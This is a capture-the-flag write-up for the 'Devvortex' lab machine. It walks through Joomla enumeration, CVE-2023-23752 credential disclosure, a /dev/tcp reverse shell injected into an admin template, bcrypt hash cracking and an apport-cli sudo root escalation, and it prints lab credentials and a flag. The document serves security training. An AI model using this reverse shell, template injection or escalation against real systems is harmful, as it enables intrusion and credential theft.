# Devvortex
#activemachine 
#easy 
#cms
#mysql
#crashdump 
#web 
#hashcrack 

### Reconnaissance
The recon phase involves gathering information about the target to identify potential vulnerabilities. In this case, we used the Nmap command `nmap -v -sV $TARGET` to perform a port scan of the target IP address. There are 2 open ports, the 22 (SSH) and the 80 (HTTP)

```
Nmap scan report for 10.129.171.9
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Web Application Analysis
If we try to access the website, the URL gets set to `devvortex.htb`, so we add this to our `/etc/hosts` with `echo "${TARGET} devvortex.htb" | sudo tee -a /etc/hosts`.

After performing a manual inspection on the website we don't see nothing useful, so the next step is trying to reach some hidden parts by performing a dir enumeration, to do so `dirsearch -u http://devvortex.htb/`
```

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/devvortex.htb/-_23-11-28_13-10-24.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-11-28_13-10-24.log

Target: http://devvortex.htb/

[13:10:25] Starting: 
[13:10:27] 301 -  178B  - /js  ->  http://devvortex.htb/js/
[13:10:51] 200 -    7KB - /about.html
[13:11:17] 200 -    9KB - /contact.html
[13:11:19] 301 -  178B  - /css  ->  http://devvortex.htb/css/
[13:11:29] 403 -  564B  - /images/
[13:11:29] 301 -  178B  - /images  ->  http://devvortex.htb/images/
[13:11:30] 200 -   18KB - /index.html
[13:11:32] 403 -  564B  - /js/

Task Completed

```
As well as in the manual inspection, in the dir enumeation we dont find nothing relevant, also inside the html code there isnt nothing relevant neither because there are 0 calls to JS.

As we dont have yet a way to try to break in,  we perform a subdomain scan with `gobuster vhost -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devvortex.htb`
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://devvortex.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/11/28 13:32:29 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.devvortex.htb (Status: 200) [Size: 23221]
                                                    
===============================================================
2023/11/28 13:33:39 Finished
===============================================================

```
We find a subdomain so we add it to our `/etc/hosts` as done before, `echo "${TARGET} dev.devvortex.htb" | sudo tee -a /etc/hosts`. Again we don't find nothing suspicious on the website, so again we perform a dir enumeration with the hope of finding some hidden and useful parts `dirsearch -u http://dev.devvortex.htb/`
```

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/dev.devvortex.htb/-_23-11-28_13-36-32.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-11-28_13-36-32.log

Target: http://dev.devvortex.htb/

[13:36:32] Starting: 
[13:36:35] 403 -  564B  - /%2e%2e;/test
[13:37:03] 200 -   18KB - /LICENSE.txt
[13:37:06] 200 -    5KB - /README.txt
[13:37:39] 403 -  564B  - /admin/.config
[13:37:39] 403 -  564B  - /admin/.htaccess
[13:38:11] 301 -  178B  - /administrator  ->  http://dev.devvortex.htb/administrator/
[13:38:11] 403 -  564B  - /administrator/.htaccess
[13:38:12] 403 -  564B  - /administrator/includes/
[13:38:12] 200 -   31B  - /administrator/cache/
[13:38:12] 301 -  178B  - /administrator/logs  ->  http://dev.devvortex.htb/administrator/logs/
[13:38:12] 200 -   31B  - /administrator/logs/
[13:38:13] 200 -   12KB - /administrator/index.php
[13:38:13] 200 -   12KB - /administrator/
[13:38:19] 403 -  564B  - /admpar/.ftppass
[13:38:19] 403 -  564B  - /admrev/.ftppass
[13:38:22] 301 -  178B  - /api  ->  http://dev.devvortex.htb/api/
[13:38:23] 406 -   29B  - /api/error_log
[13:38:23] 406 -   29B  - /api/2/issue/createmeta
[13:38:23] 403 -  564B  - /app/.htaccess
[13:38:23] 406 -   29B  - /api/
[13:38:23] 406 -   29B  - /api/2/explore/
[13:38:23] 406 -   29B  - /api/jsonws/invoke
[13:38:23] 406 -   29B  - /api/login.json
[13:38:23] 406 -   29B  - /api/jsonws
[13:38:23] 406 -   29B  - /api/package_search/v4/documentation
[13:38:23] 406 -   29B  - /api/swagger
[13:38:23] 406 -   29B  - /api/v3
[13:38:23] 406 -   29B  - /api/v2
[13:38:23] 406 -   29B  - /api/v1
[13:38:23] 406 -   29B  - /api/v2/helpdesk/discover
[13:38:23] 406 -   29B  - /api/swagger-ui.html
[13:38:23] 406 -   29B  - /api/swagger.yml
[13:38:37] 403 -  564B  - /bitrix/.settings
[13:38:37] 403 -  564B  - /bitrix/.settings.php.bak
[13:38:37] 403 -  564B  - /bitrix/.settings.bak
[13:38:41] 301 -  178B  - /cache  ->  http://dev.devvortex.htb/cache/
[13:38:41] 200 -   31B  - /cache/
[13:38:42] 403 -    4KB - /cache/sql_error_latest.cgi
[13:38:48] 200 -   31B  - /cli/
[13:38:51] 301 -  178B  - /components  ->  http://dev.devvortex.htb/components/
[13:38:51] 200 -   31B  - /components/
[13:38:56] 200 -    0B  - /configuration.php
[13:39:24] 403 -  564B  - /ext/.deps
[13:39:39] 200 -    7KB - /htaccess.txt
[13:39:39] 200 -   23KB - /home
[13:39:42] 301 -  178B  - /images  ->  http://dev.devvortex.htb/images/
[13:39:42] 200 -   31B  - /images/
[13:39:43] 403 -    4KB - /images/c99.php
[13:39:43] 403 -    4KB - /images/Sym.php
[13:39:44] 301 -  178B  - /includes  ->  http://dev.devvortex.htb/includes/
[13:39:44] 200 -   31B  - /includes/
[13:39:46] 200 -   23KB - /index.php
[13:39:56] 301 -  178B  - /language  ->  http://dev.devvortex.htb/language/
[13:39:56] 200 -   31B  - /layouts/
[13:39:57] 403 -  564B  - /lib/flex/uploader/.actionScriptProperties
[13:39:57] 403 -  564B  - /lib/flex/uploader/.flexProperties
[13:39:57] 403 -  564B  - /lib/flex/varien/.actionScriptProperties
[13:39:57] 403 -  564B  - /lib/flex/uploader/.settings
[13:39:57] 403 -  564B  - /lib/flex/varien/.flexLibProperties
[13:39:57] 403 -  564B  - /lib/flex/varien/.settings
[13:39:57] 403 -  564B  - /lib/flex/varien/.project
[13:39:57] 403 -  564B  - /lib/flex/uploader/.project
[13:39:57] 301 -  178B  - /libraries  ->  http://dev.devvortex.htb/libraries/
[13:39:57] 200 -   31B  - /libraries/
[13:40:07] 403 -  564B  - /mailer/.env
[13:40:10] 301 -  178B  - /media  ->  http://dev.devvortex.htb/media/
[13:40:11] 200 -   31B  - /media/
[13:40:16] 301 -  178B  - /modules  ->  http://dev.devvortex.htb/modules/
[13:40:17] 200 -   31B  - /modules/
[13:40:47] 200 -   31B  - /plugins/
[13:40:47] 301 -  178B  - /plugins  ->  http://dev.devvortex.htb/plugins/
[13:40:59] 403 -  564B  - /resources/.arch-internal-preview.css
[13:40:59] 403 -  564B  - /resources/sass/.sass-cache/
[13:41:01] 200 -  764B  - /robots.txt
[13:41:28] 200 -   31B  - /templates/
[13:41:28] 301 -  178B  - /templates  ->  http://dev.devvortex.htb/templates/
[13:41:28] 200 -   31B  - /templates/index.html
[13:41:29] 200 -    0B  - /templates/system/
[13:41:32] 200 -   31B  - /tmp/
[13:41:32] 301 -  178B  - /tmp  ->  http://dev.devvortex.htb/tmp/
[13:41:33] 403 -    4KB - /tmp/2.php
[13:41:33] 403 -    4KB - /tmp/admin.php
[13:41:33] 403 -    4KB - /tmp/d.php
[13:41:33] 403 -    4KB - /tmp/changeall.php
[13:41:33] 403 -    4KB - /tmp/cgi.pl
[13:41:33] 403 -    4KB - /tmp/Cgishell.pl
[13:41:33] 403 -    4KB - /tmp/cpn.php
[13:41:33] 403 -    4KB - /tmp/d0maine.php
[13:41:33] 403 -    4KB - /tmp/domaine.pl
[13:41:33] 403 -    4KB - /tmp/domaine.php
[13:41:33] 403 -    4KB - /tmp/dz1.php
[13:41:33] 403 -    4KB - /tmp/dz.php
[13:41:33] 403 -    4KB - /tmp/killer.php
[13:41:33] 403 -    4KB - /tmp/L3b.php
[13:41:33] 403 -    4KB - /tmp/index.php
[13:41:34] 403 -    4KB - /tmp/priv8.php
[13:41:34] 403 -    4KB - /tmp/root.php
[13:41:34] 403 -    4KB - /tmp/Sym.php
[13:41:34] 403 -    4KB - /tmp/sql.php
[13:41:34] 403 -    4KB - /tmp/upload.php
[13:41:34] 403 -    4KB - /tmp/madspotshell.php
[13:41:34] 403 -    4KB - /tmp/up.php
[13:41:34] 403 -    4KB - /tmp/whmcs.php
[13:41:34] 403 -    4KB - /tmp/xd.php
[13:41:34] 403 -    4KB - /tmp/uploads.php
[13:41:34] 403 -    4KB - /tmp/user.php
[13:41:34] 403 -    4KB - /tmp/vaga.php
[13:41:35] 403 -  564B  - /twitter/.env
[13:41:46] 200 -    3KB - /web.config.txt

Task Completed

```
Of all the hidden paths the one that seems more interesting is the `/administrator` so we access it, here we realize that the whole website is build with joomla a common CMS, so we use a tool designed for this CMS in particular `joomscan -u http://dev.devvortex.htb`
```
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://dev.devvortex.htb ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.6

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://dev.devvortex.htb/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://dev.devvortex.htb/robots.txt 

Interesting path found from robots.txt
http://dev.devvortex.htb/joomla/administrator/
http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/api/
http://dev.devvortex.htb/bin/
http://dev.devvortex.htb/cache/
http://dev.devvortex.htb/cli/
http://dev.devvortex.htb/components/
http://dev.devvortex.htb/includes/
http://dev.devvortex.htb/installation/
http://dev.devvortex.htb/language/
http://dev.devvortex.htb/layouts/
http://dev.devvortex.htb/libraries/
http://dev.devvortex.htb/logs/
http://dev.devvortex.htb/modules/
http://dev.devvortex.htb/plugins/
http://dev.devvortex.htb/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/dev.devvortex.htb/
```

The tool provides us the valuable information of the specific version that is running `Joomla 4.2.6`, so we can search if there any associated CVEs, after researching the version we find it has a recent [CVE](https://nvd.nist.gov/vuln/detail/CVE-2023-23752).
Now that we know that there is a vulnerability we can use, we search for the associated [exploit]( https://www.exploit-db.com/exploits/51334 ).
After downloading the exploit we run it as `ruby 51334.rb http://dev.devvortex.htb`
```
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```
With our new credentials we are able to enter the Joomla administrator panel, once inside we can modify the admin template code to inject a reverse shell, in particular if we modify `index.php` each time we go to the home of the admin panel de reverse shell will be launched, to do so we add this line to `index.php`   `system("bash -c 'sh -i >& /dev/tcp/10.10.14.52/4444 0>&1'");`
Now before launching the reverse shell we launch the listener with `nc -lvnp 4444`.

Once inside we improve the terminal `python3 -c 'import pty;pty.spawn("/bin/bash")'`
### MYSQL Service
As we don't have even a normal user account we must do a lateral movement first, to do this we can use the database credentials we found earlier, the command to access the database is ` mysql -u lewis -p joomla --password=P4ntherg0t1n5r3c0n##`.
The first step inside the database as always is to list all the existing tables
```
mysql> show tables;
show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.00 sec)

```
One table seems special this is `sd4fg_users` because it can contain the credentials we are looking for, so we list all the contents of that table.
```
SELECT * FROM sd4fg_users;
SELECT * FROM sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2023-11-28 13:34:43 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.01 sec)
```
Bingo, we found 2 hashes in this table so we save both of them into a file, now we can try to perform a dictionary attack over them with `john -w=/usr/share/wordlists/rockyou.txt hashes`
```
Using default input encoding: UTF-8
Loaded 2 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)
1g 0:00:00:20 DONE (2023-11-28 14:37) 0.04980g/s 69.92p/s 69.92c/s 69.92C/s lacoste..harry
Use the "--show" option to display all of the cracked passwords reliably
Session complete
```
The password of l`ogan` is `tequieromucho`
### Privilege escalation
We login as `logan` with SSH by running `ssh logan@$TARGET`
Now we have the user flag in our home inside `uset.txt`
In order to perform the privilege escalation we start by checking if our user is in some kind of special groups or if it is able to run any particular command as root `id && sudo -l`
```
uid=1000(logan) gid=1000(logan) groups=1000(logan)
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```
Since the user can run a command with sudo, we look for the specific version of the tool
```
sudo /usr/bin/apport-cli -v
2.20.11
```
With the version we can conduct a research to find if there are any known bugs that allow us to exploit it, we find this [reported exploitable bug](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb). The tool needs a crash dump to be run, so to generate one we do `sleep 30 & killall -SIGSEGV sleep`
With our brand new crash dump generated we can finally use the tool `sudo apport-cli -c /var/crash/_usr_bin_sleep.1000.crash`
When the program asks us to choose a option we enter `V`, then we can write commands preceded by `!`
```
!id
uid=0(root) gid=0(root) groups=0(root)
!cat /root/root.txt
b4d42bc4f233290ecb69d2cb0b6b8b9f
```
